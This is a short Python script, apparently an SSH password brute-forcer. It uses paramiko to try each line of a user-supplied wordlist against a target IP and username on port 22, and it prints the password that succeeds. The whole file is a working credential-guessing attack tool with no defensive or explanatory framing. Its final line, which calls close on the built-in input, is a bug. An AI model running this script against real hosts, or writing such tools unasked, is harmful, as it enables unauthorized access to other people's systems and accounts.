import paramiko, sys, os

target = f"{input('Enter target IP: ')}"
username = f"{input('Enter Username: ')}"
password_file = f"{input('Password file location: ')}"

def ssh_connect(password, code=0): # code 0 = successful code = 1 failed authentication
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1
    ssh.close()
    return code

with open(password_file, 'r') as file:
    for line in file.readlines():
        password =line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(f"Password found: {password}")
                exit(0)
            elif response == 1:
                print('No joy')
        except Exception as e:
            print(e)
        pass
    input.close()